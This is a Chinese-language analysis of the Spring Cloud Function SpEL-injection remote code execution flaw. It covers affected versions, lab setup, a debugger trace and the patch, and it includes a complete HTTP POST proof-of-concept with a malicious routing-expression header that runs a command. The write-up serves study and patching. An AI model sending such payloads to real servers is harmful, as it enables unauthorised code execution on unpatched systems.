## 写在前面

本次测试分析仅供学习使用，如若非法他用，与本文作者无关，需自行负责！

## 漏洞信息

Spring Cloud Function存在远程代码执行漏洞，在 Spring Cloud Function 版本 3.1.6、3.2.2
和不受支持的旧版本中，当使用路由功能时，用户可以提供特制的 SpEL 作为路由表达式，这可能导致远程代码执行和对本地资源的访问。

![1654908150_62a3e4f6daee1778e6819.png!small?1654908151008](https://image.3001.net/images/20220611/1654908150_62a3e4f6daee1778e6819.png!small?1654908151008)

## 影响范围

Spring Cloud Function 3.1.x<=3.1.6

Spring Cloud Function 3.2.x<=3.2.2

## 搭建漏洞分析环境及复现

### 漏洞成因

该漏洞是由RoutingFunction功能导致。在Spring Cloud
Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞。

![1654908245_62a3e5557589c13dbdbfe.png!small?1654908245785](https://image.3001.net/images/20220611/1654908245_62a3e5557589c13dbdbfe.png!small?1654908245785)

### 漏洞复现及分析

1.下载漏洞环境源码

<https://github.com/cckuailong/spring-cloud-function-SpEL-RCE>

![1654908296_62a3e588de3caacc2af74.png!small?1654908297040](https://image.3001.net/images/20220611/1654908296_62a3e588de3caacc2af74.png!small?1654908297040)

2.使用IDEA mave进行打包调试， pom文件如下

http://www.w3.org/2001/XMLSchema-instance"
xmlns="<http://maven.apache.org/POM/4.0.0>"
xsi:schemaLocation="<http://maven.apache.org/POM/4.0.0><https://maven.apache.org/xsd/maven-4.0.0.xsd>">

4.0.0

io.spring.sample

function-sample-pojo

3.2.1.RELEASE

jar

function-sample-pojo

Spring Cloud Function Web Support

org.springframework.boot

spring-boot-starter-parent

3.0.0-SNAPSHOT

3.2.1-SNAPSHOT

1.0.27.RELEASE

org.springframework.cloud

spring-cloud-starter-function-webflux

org.springframework.boot

spring-boot-configuration-processor

true

org.springframework.boot

spring-boot-starter-test

test

org.springframework.cloud

spring-cloud-function-dependencies

${spring-cloud-function.version}

pom

import

org.apache.maven.plugins

maven-deploy-plugin

true

org.springframework.boot

spring-boot-maven-plugin

org.springframework.boot.experimental

spring-boot-thin-layout

${wrapper.version}

maven-surefire-plugin

**/*Tests.java

**/*Test.java

**/Abstract*.java

spring-snapshots

Spring Snapshots

<https://repo.spring.io/libs-snapshot-local>

true

false

spring-milestones

Spring Milestones

<https://repo.spring.io/libs-milestone-local>

false

spring-releases

Spring Releases

<https://repo.spring.io/release>

false

spring-snapshots

Spring Snapshots

<https://repo.spring.io/libs-snapshot-local>

true

false

spring-milestones

Spring Milestones

<https://repo.spring.io/libs-milestone-local>

false

spring-releases

Spring Releases

<https://repo.spring.io/libs-release-local>

false

3.修改spring默认端口8080，防止端口冲突这里因情况而定.可编辑application.properties修改。

![1654908470_62a3e6368ea72da27a07c.png!small?1654908470690](https://image.3001.net/images/20220611/1654908470_62a3e6368ea72da27a07c.png!small?1654908470690)

4.运行环境进行RCE复现

启动漏洞环境

![1654908502_62a3e656628587d2dbb4d.png!small?1654908502431](https://image.3001.net/images/20220611/1654908502_62a3e656628587d2dbb4d.png!small?1654908502431)

访问地址

<http://10.211.55.7:8090/>

![1654908547_62a3e6832cdf7ce62ff5f.png!small?1654908547337](https://image.3001.net/images/20220611/1654908547_62a3e6832cdf7ce62ff5f.png!small?1654908547337)

复现RCE命令执行

POST /functionRouter HTTP/1.1

Host: 10.211.55.7:8090

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36

Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive
spring.cloud.function.routing-expression:
T(java.lang.Runtime).getRuntime().exec("calc")

Accept-Language: en

Content-Type: application/x-www-form-urlencoded

Content-Length: 4

![1654908647_62a3e6e76cb7bc0cdcfec.png!small?1654908647976](https://image.3001.net/images/20220611/1654908647_62a3e6e76cb7bc0cdcfec.png!small?1654908647976)

5.漏洞分析

1.根据漏洞原理及官方测试用例可以知晓漏洞触发点在http header中spring.cloud.function.routing-expression字段。

首先找到在FunctionController.java 文件，在FunctionWrapper设置断点进行调试

![1654908706_62a3e7225e9f699f45f46.png!small?1654908706484](https://image.3001.net/images/20220611/1654908706_62a3e7225e9f699f45f46.png!small?1654908706484)

然后进行跟进请求进入到apply方法，接着调用了route方法，通过判断特定的消息头信息是否为空，如果不为空则调用functionFromExpression方法。

![1654908741_62a3e74533bee17811241.png!small?1654908741422](https://image.3001.net/images/20220611/1654908741_62a3e74533bee17811241.png!small?1654908741422)

传参来自请求头中 spring.cloud.function.routing-expression 的值

![1654908773_62a3e765cf90f6ed70215.png!small?1654908774054](https://image.3001.net/images/20220611/1654908773_62a3e765cf90f6ed70215.png!small?1654908774054)

继续跟进调试

![1654908809_62a3e789b13a8028b638d.png!small?1654908809899](https://image.3001.net/images/20220611/1654908809_62a3e789b13a8028b638d.png!small?1654908809899)

到functionFromExpression中,即调用Expression对传入的SPEL表达式进行解析,随后调用expression.getValue执行命令

![1654908844_62a3e7aca448f7a32457a.png!small?1654908845631](https://image.3001.net/images/20220611/1654908844_62a3e7aca448f7a32457a.png!small?1654908845631)

## 修复建议

在修复版本中对header使用SimpleEvaluationContext进行安全处理

![1654908886_62a3e7d645bbbee8b7e43.png!small?1654908886493](https://image.3001.net/images/20220611/1654908886_62a3e7d645bbbee8b7e43.png!small?1654908886493)

目前官方已有可更新版本

3.1.7

3.2.3

## 参考链接

> <https://github.com/spring-cloud/spring-cloud-> function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f#diff-74927ccf09f812b7124a2ff381cd17c075bbe31296412ce7c3adf569f08a8aab>
>
> <https://mp.weixin.qq.com/s/2gKqp3YJtZJ7MMtbkHhOBA>
>
> <https://mp.weixin.qq.com/s/BaXS6I1o0YUt8Npe--Mpbg>

